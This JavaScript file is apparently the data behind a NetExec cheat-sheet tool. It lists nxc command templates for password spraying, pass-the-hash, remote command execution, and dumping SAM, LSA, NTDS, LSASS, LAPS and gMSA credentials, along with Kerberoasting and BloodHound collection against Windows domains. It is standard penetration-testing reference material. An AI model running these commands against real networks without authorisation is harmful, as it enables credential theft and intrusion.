/* ♥ NXComs - Commands Database ♥ */

const commands = [
    // ==================== INSTALLATION ====================
    {
        title: "Install NetExec via pipx",
        description: "Install NetExec using pipx for isolated Python environment",
        command: "sudo apt install pipx git\npipx ensurepath\npipx install git+https://github.com/Pennyw0rth/NetExec",
        protocol: "smb",
        category: "authentication",
        flags: ["installation"]
    },

    // ==================== AUTHENTICATION ====================
    {
        title: "Basic Authentication",
        description: "Authenticate with username and password",
        command: "nxc smb <target> -u <username> -p <password>",
        protocol: "smb",
        category: "authentication",
        flags: ["basic"]
    },
    {
        title: "Hash Authentication",
        description: "Authenticate using NTLM hash instead of password",
        command: "nxc smb <target> -u <username> -H <ntlm_hash>",
        protocol: "smb",
        category: "authentication",
        flags: ["hash", "pth"]
    },
    {
        title: "Null Authentication",
        description: "Attempt authentication with null session (no credentials)",
        command: "nxc smb <target> -u '' -p ''",
        protocol: "smb",
        category: "authentication",
        flags: ["null-session"]
    },
    {
        title: "Guest Authentication",
        description: "Authenticate as guest user",
        command: "nxc smb <target> -u 'guest' -p ''",
        protocol: "smb",
        category: "authentication",
        flags: ["guest"]
    },
    {
        title: "Local Authentication",
        description: "Use local account instead of domain account",
        command: "nxc smb <target> -u <username> -p <password> --local-auth",
        protocol: "smb",
        category: "authentication",
        flags: ["local"]
    },
    {
        title: "Kerberos Authentication",
        description: "Authenticate using Kerberos tickets",
        command: "nxc smb <target> -u <username> -p <password> -k",
        protocol: "smb",
        category: "authentication",
        flags: ["kerberos"]
    },
    {
        title: "Use Kerberos Cache",
        description: "Authenticate using cached Kerberos ticket",
        command: "nxc ldap <target> --use-kcache",
        protocol: "ldap",
        category: "authentication",
        flags: ["kerberos", "ccache"]
    },

    // ==================== SMB ENUMERATION ====================
    {
        title: "Basic SMB Enumeration",
        description: "Basic SMB enumeration without credentials",
        command: "nxc smb <target>",
        protocol: "smb",
        category: "enumeration",
        flags: ["basic"]
    },
    {
        title: "Enumerate Shares (Null Session)",
        description: "List SMB shares using null authentication",
        command: "nxc smb <target> -u '' -p '' --shares",
        protocol: "smb",
        category: "enumeration",
        flags: ["shares", "null-session"]
    },
    {
        title: "Enumerate Shares (Authenticated)",
        description: "List SMB shares with valid credentials",
        command: "nxc smb <target> -u <username> -p <password> --shares",
        protocol: "smb",
        category: "enumeration",
        flags: ["shares"]
    },
    {
        title: "Enumerate Users (Null Session)",
        description: "List domain users using null authentication",
        command: "nxc smb <target> -u '' -p '' --users",
        protocol: "smb",
        category: "enumeration",
        flags: ["users", "null-session"]
    },
    {
        title: "RID Brute Force",
        description: "Enumerate users via RID cycling",
        command: "nxc smb <target> -u '' -p '' --rid-brute",
        protocol: "smb",
        category: "enumeration",
        flags: ["users", "rid"]
    },
    {
        title: "Enumerate Groups",
        description: "List domain groups",
        command: "nxc smb <target> -u <username> -p <password> --groups",
        protocol: "smb",
        category: "enumeration",
        flags: ["groups"]
    },
    {
        title: "Enumerate Local Groups",
        description: "List local groups on target",
        command: "nxc smb <target> -u <username> -p <password> --local-groups",
        protocol: "smb",
        category: "enumeration",
        flags: ["groups", "local"]
    },
    {
        title: "Enumerate Logged On Users",
        description: "List currently logged on users",
        command: "nxc smb <target> -u <username> -p <password> --loggedon-users",
        protocol: "smb",
        category: "enumeration",
        flags: ["users", "sessions"]
    },
    {
        title: "Enumerate Sessions",
        description: "List active sessions on target",
        command: "nxc smb <target> -u <username> -p <password> --sessions",
        protocol: "smb",
        category: "enumeration",
        flags: ["sessions"]
    },
    {
        title: "Password Policy",
        description: "Enumerate domain password policy",
        command: "nxc smb <target> -u <username> -p <password> --pass-pol",
        protocol: "smb",
        category: "enumeration",
        flags: ["policy"]
    },
    {
        title: "Comprehensive SMB Enumeration",
        description: "Run all SMB enumeration options at once",
        command: "nxc smb <target> -u <username> -p <password> --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol",
        protocol: "smb",
        category: "enumeration",
        flags: ["comprehensive"]
    },

    // ==================== PASSWORD SPRAYING ====================
    {
        title: "Password Spray (Single Password)",
        description: "Spray a single password against multiple users",
        command: "nxc smb <target> -u users.txt -p <password> --continue-on-success",
        protocol: "smb",
        category: "authentication",
        flags: ["password-spray"]
    },
    {
        title: "Password Spray (Multiple Passwords)",
        description: "Spray multiple passwords against multiple users without brute forcing",
        command: "nxc smb <target> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
        protocol: "smb",
        category: "authentication",
        flags: ["password-spray"]
    },
    {
        title: "SSH Password Spray",
        description: "Password spray against SSH service",
        command: "nxc ssh <target> -u <username> -p <password> --continue-on-success",
        protocol: "ssh",
        category: "authentication",
        flags: ["password-spray"]
    },

    // ==================== SMB SIGNING ====================
    {
        title: "Check SMB Signing",
        description: "Check SMB signing status and generate relay list",
        command: "nxc smb <target> --gen-relay-list relay.txt",
        protocol: "smb",
        category: "enumeration",
        flags: ["smb-signing", "relay"]
    },

    // ==================== COMMAND EXECUTION ====================
    {
        title: "Execute Command (SMB)",
        description: "Execute command on remote system via SMB",
        command: "nxc smb <target> -u <username> -p <password> -x <command>",
        protocol: "smb",
        category: "execution",
        flags: ["command"]
    },
    {
        title: "Execute PowerShell (SMB)",
        description: "Execute PowerShell command via SMB",
        command: "nxc smb <target> -u <username> -p <password> -X <powershell_command>",
        protocol: "smb",
        category: "execution",
        flags: ["powershell"]
    },
    {
        title: "Execute Command (WinRM)",
        description: "Execute command via WinRM",
        command: "nxc winrm <target> -u <username> -p <password> -x <command>",
        protocol: "winrm",
        category: "execution",
        flags: ["command"]
    },
    {
        title: "Execute Command (MSSQL)",
        description: "Execute command via MSSQL xp_cmdshell",
        command: "nxc mssql <target> -u <username> -p <password> -x <command>",
        protocol: "mssql",
        category: "execution",
        flags: ["command"]
    },
    {
        title: "Execute Command (SSH)",
        description: "Execute command via SSH",
        command: "nxc ssh <target> -u <username> -p <password> -x <command>",
        protocol: "ssh",
        category: "execution",
        flags: ["command"]
    },

    // ==================== FILE OPERATIONS ====================
    {
        title: "Get File (SMB)",
        description: "Download file from remote SMB share",
        command: "nxc smb <target> -u <username> -p <password> --get-file <remote_path> <local_path> --share <sharename>",
        protocol: "smb",
        category: "lateral",
        flags: ["file-transfer"]
    },
    {
        title: "Put File (SMB)",
        description: "Upload file to remote SMB share",
        command: "nxc smb <target> -u <username> -p <password> --put-file <local_path> <remote_path> --share <sharename>",
        protocol: "smb",
        category: "lateral",
        flags: ["file-transfer"]
    },
    {
        title: "Get File (MSSQL)",
        description: "Download file via MSSQL",
        command: "nxc mssql <target> -u <username> -p <password> --get-file <local_path> <remote_path>",
        protocol: "mssql",
        category: "lateral",
        flags: ["file-transfer"]
    },
    {
        title: "Spider Plus Module",
        description: "Spider SMB shares and download interesting files",
        command: "nxc smb <target> -u <username> -p <password> -M spider_plus",
        protocol: "smb",
        category: "enumeration",
        flags: ["module", "shares"]
    },
    {
        title: "Spider Plus (Include Writable)",
        description: "Spider shares including writable files",
        command: "nxc smb <target> -u <username> -p <password> -M spider_plus -o READ_ONLY=false",
        protocol: "smb",
        category: "enumeration",
        flags: ["module", "shares"]
    },

    // ==================== CREDENTIAL DUMPING ====================
    {
        title: "Dump SAM",
        description: "Extract local account hashes from SAM database",
        command: "nxc smb <target> -u <username> -p <password> --sam",
        protocol: "smb",
        category: "credentials",
        flags: ["sam", "hashes"]
    },
    {
        title: "Dump LSA Secrets",
        description: "Extract LSA secrets including cached credentials",
        command: "nxc smb <target> -u <username> -p <password> --lsa",
        protocol: "smb",
        category: "credentials",
        flags: ["lsa", "secrets"]
    },
    {
        title: "Dump NTDS",
        description: "Extract domain credentials from NTDS.dit (Domain Controller)",
        command: "nxc smb <target> -u <username> -p <password> --ntds",
        protocol: "smb",
        category: "credentials",
        flags: ["ntds", "domain-controller"]
    },
    {
        title: "Dump NTDS (VSS Method)",
        description: "Extract NTDS using VSS shadow copy",
        command: "nxc smb <target> -u <username> -p <password> --ntds vss",
        protocol: "smb",
        category: "credentials",
        flags: ["ntds", "vss"]
    },
    {
        title: "NTDS Util Module",
        description: "Use ntdsutil module for credential extraction",
        command: "nxc smb <target> -u <username> -p <password> -M ntdsutil",
        protocol: "smb",
        category: "credentials",
        flags: ["module", "ntds"]
    },
    {
        title: "Dump LSASS (lsassy)",
        description: "Extract credentials from LSASS memory",
        command: "nxc smb <target> -u <username> -p <password> -M lsassy",
        protocol: "smb",
        category: "credentials",
        flags: ["module", "lsass"]
    },
    {
        title: "DPAPI Secrets",
        description: "Extract DPAPI secrets and decrypt credentials",
        command: "nxc smb <target> -u <username> -p <password> --dpapi",
        protocol: "smb",
        category: "credentials",
        flags: ["dpapi"]
    },
    {
        title: "Combined Credential Dump",
        description: "Dump SAM, LSA, and DPAPI in one command",
        command: "nxc smb <target> -u <username> -p <password> --sam --lsa --dpapi",
        protocol: "smb",
        category: "credentials",
        flags: ["comprehensive"]
    },

    // ==================== LAPS ====================
    {
        title: "Dump LAPS Passwords",
        description: "Extract LAPS (Local Administrator Password Solution) passwords",
        command: "nxc smb <target> -u <username> -p <password> --laps",
        protocol: "smb",
        category: "credentials",
        flags: ["laps"]
    },
    {
        title: "LAPS Password Dump (LDAP)",
        description: "Extract LAPS passwords via LDAP",
        command: "nxc ldap <target> -u <username> -p <password> -M laps",
        protocol: "ldap",
        category: "credentials",
        flags: ["module", "laps"]
    },

    // ==================== GPP PASSWORDS ====================
    {
        title: "Extract GPP Passwords",
        description: "Find and decrypt Group Policy Preferences passwords",
        command: "nxc smb <target> -u <username> -p <password> -M gpp_password",
        protocol: "smb",
        category: "credentials",
        flags: ["module", "gpp"]
    },
    {
        title: "MSOL Account Credentials",
        description: "Extract MSOL (Azure AD Connect) account credentials",
        command: "nxc smb <target> -u <username> -p <password> -M msol",
        protocol: "smb",
        category: "credentials",
        flags: ["module", "azure"]
    },

    // ==================== LDAP ENUMERATION ====================
    {
        title: "LDAP User Enumeration (Null Session)",
        description: "Enumerate users via LDAP with null authentication",
        command: "nxc ldap <target> -u '' -p '' --users",
        protocol: "ldap",
        category: "enumeration",
        flags: ["users", "null-session"]
    },
    {
        title: "LDAP User Enumeration",
        description: "Enumerate domain users via LDAP",
        command: "nxc ldap <target> -u <username> -p <password> --users",
        protocol: "ldap",
        category: "enumeration",
        flags: ["users"]
    },
    {
        title: "LDAP Group Enumeration",
        description: "Enumerate domain groups via LDAP",
        command: "nxc ldap <target> -u <username> -p <password> --groups",
        protocol: "ldap",
        category: "enumeration",
        flags: ["groups"]
    },
    {
        title: "Comprehensive LDAP Enumeration",
        description: "Run multiple LDAP enumeration queries",
        command: "nxc ldap <target> -u <username> -p <password> --trusted-for-delegation --password-not-required --admin-count --users --groups",
        protocol: "ldap",
        category: "enumeration",
        flags: ["comprehensive"]
    },
    {
        title: "Find Delegation",
        description: "Find accounts configured for delegation",
        command: "nxc ldap <target> -u <username> -p <password> --find-delegation",
        protocol: "ldap",
        category: "enumeration",
        flags: ["delegation"]
    },
    {
        title: "Find Trusted for Delegation",
        description: "Find computers/users trusted for delegation",
        command: "nxc ldap <target> -u <username> -p <password> --trusted-for-delegation",
        protocol: "ldap",
        category: "enumeration",
        flags: ["delegation"]
    },
    {
        title: "Password Not Required",
        description: "Find accounts with password not required flag",
        command: "nxc ldap <target> -u <username> -p <password> --password-not-required",
        protocol: "ldap",
        category: "enumeration",
        flags: ["password-policy"]
    },
    {
        title: "Admin Count Users",
        description: "Find users with adminCount=1 attribute",
        command: "nxc ldap <target> -u <username> -p <password> --admin-count",
        protocol: "ldap",
        category: "enumeration",
        flags: ["privileged"]
    },

    // ==================== KERBEROS ATTACKS ====================
    {
        title: "Kerberoasting",
        description: "Request TGS tickets for accounts with SPNs",
        command: "nxc ldap <target> -u <username> -p <password> --kerberoasting <output_file>",
        protocol: "ldap",
        category: "exploitation",
        flags: ["kerberos", "kerberoasting"]
    },
    {
        title: "ASREPRoasting",
        description: "Get AS-REP hashes for accounts without pre-auth",
        command: "nxc ldap <target> -u <username> -p <password> --asreproast <output_file>",
        protocol: "ldap",
        category: "exploitation",
        flags: ["kerberos", "asreproast"]
    },

    // ==================== BLOODHOUND ====================
    {
        title: "BloodHound Collection",
        description: "Collect BloodHound data via LDAP",
        command: "nxc ldap <target> -u <username> -p <password> --bloodhound --dns-server <dns_ip> --dns-tcp -c all",
        protocol: "ldap",
        category: "enumeration",
        flags: ["bloodhound"]
    },
    {
        title: "BloodHound Collection (Specific)",
        description: "Collect specific BloodHound data types",
        command: "nxc ldap <target> -u <username> -p <password> --bloodhound -c DCOnly",
        protocol: "ldap",
        category: "enumeration",
        flags: ["bloodhound"]
    },

    // ==================== LDAP MODULES ====================
    {
        title: "LDAP Signing Check",
        description: "Check if LDAP signing is enforced",
        command: "nxc ldap <target> -u <username> -p <password> -M ldap-checker",
        protocol: "ldap",
        category: "enumeration",
        flags: ["module", "ldap-signing"]
    },
    {
        title: "ADCS Enumeration",
        description: "Enumerate Active Directory Certificate Services",
        command: "nxc ldap <target> -u <username> -p <password> -M adcs",
        protocol: "ldap",
        category: "enumeration",
        flags: ["module", "adcs"]
    },
    {
        title: "MachineAccountQuota",
        description: "Check MachineAccountQuota attribute",
        command: "nxc ldap <target> -u <username> -p <password> -M maq",
        protocol: "ldap",
        category: "enumeration",
        flags: ["module", "maq"]
    },
    {
        title: "Pre-Created Computer Accounts",
        description: "Find pre-Windows 2000 computer accounts",
        command: "nxc ldap <target> -u <username> -p <password> -M pre2k",
        protocol: "ldap",
        category: "enumeration",
        flags: ["module"]
    },

    // ==================== gMSA ====================
    {
        title: "Enumerate gMSA",
        description: "Enumerate Group Managed Service Accounts",
        command: "nxc ldap <target> -u <username> -p <password> --gmsa",
        protocol: "ldap",
        category: "enumeration",
        flags: ["gmsa"]
    },
    {
        title: "Convert gMSA ID",
        description: "Convert gMSA managed password ID",
        command: "nxc ldap <target> -u <username> -p <password> --gmsa-convert-id <id>",
        protocol: "ldap",
        category: "credentials",
        flags: ["gmsa"]
    },
    {
        title: "Decrypt gMSA from LSA",
        description: "Decrypt gMSA password from LSA",
        command: "nxc ldap <domain> -u <username> -p <password> --gmsa-decrypt-lsa <gmsa_account>",
        protocol: "ldap",
        category: "credentials",
        flags: ["gmsa", "lsa"]
    },

    // ==================== MSSQL ====================
    {
        title: "MSSQL Authentication",
        description: "Authenticate to MSSQL server",
        command: "nxc mssql <target> -u <username> -p <password>",
        protocol: "mssql",
        category: "authentication",
        flags: ["basic"]
    },
    {
        title: "MSSQL Query Execution",
        description: "Execute SQL query on MSSQL server",
        command: "nxc mssql <target> -u <username> -p <password> -q '<SQL_query>'",
        protocol: "mssql",
        category: "execution",
        flags: ["query"]
    },

    // ==================== FTP ====================
    {
        title: "FTP Directory Listing",
        description: "List FTP directory contents",
        command: "nxc ftp <target> -u <username> -p <password> --ls",
        protocol: "ftp",
        category: "enumeration",
        flags: ["directory"]
    },
    {
        title: "FTP List Specific Folder",
        description: "List specific FTP folder",
        command: "nxc ftp <target> -u <username> -p <password> --ls <folder_name>",
        protocol: "ftp",
        category: "enumeration",
        flags: ["directory"]
    },
    {
        title: "FTP Download File",
        description: "Download file from FTP server",
        command: "nxc ftp <target> -u <username> -p <password> --ls <folder> --get <filename>",
        protocol: "ftp",
        category: "lateral",
        flags: ["file-transfer"]
    },

    // ==================== WINRM ====================
    {
        title: "WinRM Authentication",
        description: "Authenticate via WinRM",
        command: "nxc winrm <target> -u <username> -p <password>",
        protocol: "winrm",
        category: "authentication",
        flags: ["basic"]
    },
    {
        title: "WinRM Command Execution",
        description: "Execute command via WinRM",
        command: "nxc winrm <target> -u <username> -p <password> -x <command>",
        protocol: "winrm",
        category: "execution",
        flags: ["command"]
    },
    {
        title: "WinRM PowerShell Execution",
        description: "Execute PowerShell via WinRM",
        command: "nxc winrm <target> -u <username> -p <password> -X <powershell_command>",
        protocol: "winrm",
        category: "execution",
        flags: ["powershell"]
    },

    // ==================== RDP ====================
    {
        title: "RDP Authentication",
        description: "Test RDP authentication",
        command: "nxc rdp <target> -u <username> -p <password>",
        protocol: "rdp",
        category: "authentication",
        flags: ["basic"]
    },
    {
        title: "RDP Screenshot",
        description: "Take screenshot via RDP connection",
        command: "nxc rdp <target> -u <username> -p <password> --screenshot",
        protocol: "rdp",
        category: "enumeration",
        flags: ["screenshot"]
    },

    // ==================== WMI ====================
    {
        title: "WMI Authentication",
        description: "Authenticate via WMI",
        command: "nxc wmi <target> -u <username> -p <password>",
        protocol: "wmi",
        category: "authentication",
        flags: ["basic"]
    },
    {
        title: "WMI Command Execution",
        description: "Execute command via WMI",
        command: "nxc wmi <target> -u <username> -p <password> -x <command>",
        protocol: "wmi",
        category: "execution",
        flags: ["command"]
    },

    // ==================== CONFIGURATION ====================
    {
        title: "Generate Hosts File",
        description: "Generate /etc/hosts file for lab environment",
        command: "nxc smb <target> --generate-hosts-file <output_file>",
        protocol: "smb",
        category: "enumeration",
        flags: ["config"]
    },
    {
        title: "Generate Kerberos Config",
        description: "Generate krb5.conf file for Kerberos authentication",
        command: "nxc smb <target> -u <username> -p <password> --generate-krb5-file <output_file>",
        protocol: "smb",
        category: "authentication",
        flags: ["kerberos", "config"]
    },

    // ==================== DATABASE ====================
    {
        title: "Export Database",
        description: "Export NetExec database to file",
        command: "nxc smb --export-db <output_file>",
        protocol: "smb",
        category: "enumeration",
        flags: ["database"]
    },

    // ==================== MODULES ====================
    {
        title: "List Available Modules",
        description: "List all available NetExec modules",
        command: "nxc smb -L",
        protocol: "smb",
        category: "enumeration",
        flags: ["module"]
    },
    {
        title: "Module Information",
        description: "Get information about a specific module",
        command: "nxc smb -M <module_name> --options",
        protocol: "smb",
        category: "enumeration",
        flags: ["module"]
    },

    // ==================== ADVANCED ====================
    {
        title: "IPv6 Support",
        description: "Use IPv6 for connections",
        command: "nxc smb <target> -u <username> -p <password> -6",
        protocol: "smb",
        category: "enumeration",
        flags: ["ipv6"]
    },
    {
        title: "Custom Port",
        description: "Specify custom port for connection",
        command: "nxc smb <target> -u <username> -p <password> --port <port>",
        protocol: "smb",
        category: "authentication",
        flags: ["custom-port"]
    },
    {
        title: "Timeout Configuration",
        description: "Set connection timeout",
        command: "nxc smb <target> -u <username> -p <password> --timeout <seconds>",
        protocol: "smb",
        category: "authentication",
        flags: ["timeout"]
    },
    {
        title: "Threads Configuration",
        description: "Set number of concurrent threads",
        command: "nxc smb <targets> -u <username> -p <password> -t <threads>",
        protocol: "smb",
        category: "enumeration",
        flags: ["performance"]
    }
];
